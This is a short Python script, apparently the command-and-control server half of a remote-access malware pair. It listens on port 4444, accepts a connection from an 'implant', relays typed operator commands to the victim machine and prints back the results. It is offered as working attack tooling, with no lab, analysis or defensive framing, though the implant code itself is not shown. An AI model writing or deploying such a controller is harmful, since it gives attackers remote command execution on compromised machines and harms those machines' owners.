# =====================
# c2_server.py
# =====================
import socket

HOST = '0.0.0.0'
PORT = 4444

server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)

print("[*] Waiting for implant connection...")
conn, addr = server.accept()
print(f"[+] Connection from {addr}")

try:
    while True:
        cmd = input("C2> ").strip()
        if not cmd:
            continue
        conn.send(cmd.encode())

        if cmd == "exit":
            break

        buffer = b""
        while True:
            data = conn.recv(1024)
            if not data:
                break
            buffer += data
            if b"[*] END" in data or b"Implant self-destructed" in data:
                break

        print(buffer.decode(errors="ignore"))
except KeyboardInterrupt:
    print("\n[!] Interrupted")

conn.close()
server.close()
